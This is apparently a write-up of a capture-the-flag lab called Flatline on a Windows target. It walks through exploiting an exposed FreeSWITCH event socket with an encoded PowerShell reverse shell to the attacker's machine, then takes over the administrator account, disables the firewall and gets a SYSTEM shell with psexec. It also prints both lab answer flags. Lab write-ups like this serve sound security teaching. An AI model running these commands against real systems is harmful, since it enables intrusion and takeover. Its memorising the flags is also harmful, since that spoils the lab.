# Flatline Writeup

> Machine : Windows

> How low are your morals?

## Solution

First reconnaissance and port scanning.

```shell
nmap -Pn -T4 10.130.177.93
```

```text
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
8021/tcp open  ftp-proxy
```

```shell
nmap -sV -sC -Pn --open -T4 10.130.177.93 -p 3389,8021
```

```text
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
|_ssl-date: 2026-10-18T21:07:22+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-18T21:07:17+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2026-10-17T21:04:52
|_Not valid after:  2027-04-18T21:04:52
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can see two open ports 3389 (RDP) and 8021 (FreeSWITCH).
RDP is hard to exploit, so we have to focus on FreeSWITCH.

Let's try connecting via port 8021 to see what happens.

```shell
nc -nv 10.130.177.93 8021

(UNKNOWN) [10.130.177.93] 8021 (zope-ftp) open
Content-Type: auth/request

hello 
help
hmmmmm
Content-Type: text/disconnect-notice
Content-Length: 67

Disconnected, goodbye.
See you at ClueCon! http://www.cluecon.com/
```

We can't do a thing. So i search if i can find exploit for this service.

```shell
searchsploit FreeSWITCH
```

```text
FreeSWITCH 1.10.1 - Command Execution        | windows/remote/47799.txt
```

That's it we found exploit for windows.

```shell
searchsploit -m windows/remote/47799.txt
```

```shell
mv 47799.txt freeswitch-exploit.py
```

```shell
python freeswitch-exploit.py

Missing arguments
Usage: freeswitch-exploit.py <target> <cmd>
```

Using https://www.revshells.com/ we can find a PowerShell specified for Windows.

```shell
nc -lnvp 9090
```

```shell
python freeswitch-exploit.py 10.130.177.93 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANQAzAC4AMwA0ACIALAA5ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

And we successfully gain access to the machine.

```powershell
whoami
win-eom4pk0578n\nekrotic
```

And this is some commands you can try.

```powershell
whoami /priv
net users
net localgroup
net localgroup administrators
```

```powershell
cd C:\Users\Nekrotic\Desktop
```

```text
09/11/2021  08:39                38 root.txt
09/11/2021  08:39                38 user.txt
```

```powershell
cat user.txt
```

```text
THM{64bca0843d535fa73eecdc59d27cbe26}
```

> What is the user.txt flag?
> 
> THM{64bca0843d535fa73eecdc59d27cbe26}

But absolutely we can't read the root.txt. It's not that easy :)
There are many ways to read the root.txt file, but my approach relies on first gaining access to the system, and then reading the file.

First we change the administrator password.

```powershell
net user administrator Password@123
```

Then add it to the remote desktop users.

```powershell
net localgroup "remote desktop users" administrator /add
```

Then deactivate the firewall to open the SMB service.

```powershell
netsh advfirewall set allprofiles state off
```

We can check again using `nmap`.

```shell
nmap -Pn 10.130.177.93 -p 445
```

```text
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

Last thing activate the user administrator.

```powershell
net user administrator /active:yes
```

Now and finally we can back to our shell and use `NetExec` and `PsExec`.

```shell
nxc smb 10.130.177.93 -u administrator -p Password@123
```

```text
SMB         10.130.177.93   445    WIN-EOM4PK0578N  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-EOM4PK0578N) (domain:WIN-EOM4PK0578N) (signing:False) (SMBv1:None)
SMB         10.130.177.93   445    WIN-EOM4PK0578N  [+] WIN-EOM4PK0578N\administrator:Password@123 (Pwn3d!)
```

```shell
impacket-psexec administrator:Password@123@10.130.177.93
```

And we have successfully access to the machine as administrator.

```powershell
whoami
nt authority\system
```

```powershell
cd C:\Users\Nekrotic\Desktop
```

```powershell
type root.txt
```

```text
THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 
```

> What is the root.txt flag?
> 
> THM{8c8bc5558f0f3f8060d00ca231a9fb5e}

